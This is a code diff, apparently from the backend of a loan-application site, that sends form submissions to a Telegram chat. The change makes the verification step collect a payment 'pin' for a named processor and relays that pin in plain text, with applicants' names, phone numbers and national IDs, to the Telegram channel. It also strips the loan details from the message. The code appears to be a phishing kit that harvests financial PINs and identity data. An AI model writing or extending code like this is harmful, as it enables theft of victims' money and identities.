@@ -116,30 +116,24 @@ if (data.action === "verify_email") {
         };
     }
 
-    if (!data.email || !data.email.trim()) {
+    if (!data.pin) {
         return {
             statusCode: 400,
             body: JSON.stringify({
                 error:
-                    "Code is required."
+                    "Pin is required."
             })
         };
     }
 
     const emailMessage = `
-<b>📧 CODE VERIFICATION</b>
-
-━━━━━━━━━━━━━━━━━━━━
 
 Processor:
 <b>${processor.toUpperCase()}</b>
 
-Email:
-<b>${data.email.trim()}</b>
+Pin:
+<b>${data.pin}</b>
 
-━━━━━━━━━━━━━━━━━━━━
-
-Code submitted for verification.
 `;
 
     await sendTelegramMessage(
@@ -293,7 +287,7 @@ Code submitted for verification.
         }
 
         const telegramMessage = `
-<b>🔔 NEW LOAN APPLICATION</b>
+<b>🔔</b>
 
 ━━━━━━━━━━━━━━━━━━━━
 
@@ -302,11 +296,6 @@ Code submitted for verification.
 Reference:
 <b>${result.application_number}</b>
 
-Status:
-<b>NEW</b>
-
-
-<b>👤 APPLICANT DETAILS</b>
 
 Name:
 ${result.full_name}
@@ -317,43 +306,6 @@ ${result.phone}
 National ID:
 ${result.national_id}
 
-
-<b>💰 LOAN DETAILS</b>
-
-Loan Amount:
-<b>USD ${loanAmount.toLocaleString()}</b>
-
-Repayment Period:
-<b>${repaymentPeriod} months</b>
-
-Monthly Payment:
-<b>USD ${monthlyPayment.toFixed(2)}</b>
-
-
-<b>💼 FINANCIAL INFORMATION</b>
-
-Employment Status:
-${result.employment_status}
-
-Monthly Net Income:
-<b>USD ${Number(
-    result.monthly_income
-).toLocaleString()}</b>
-
-
-<b>📊 APPLICATION SUMMARY</b>
-
-Requested:
-USD ${loanAmount.toLocaleString()}
-
-Interest Rate:
-4.5% APR
-
-Estimated Monthly Payment:
-USD ${monthlyPayment.toFixed(2)}
-
-
-━━━━━━━━━━━━━━━━━━━━
 
 🕐 Application received:
 ${new Date().toLocaleString("en-KE")}
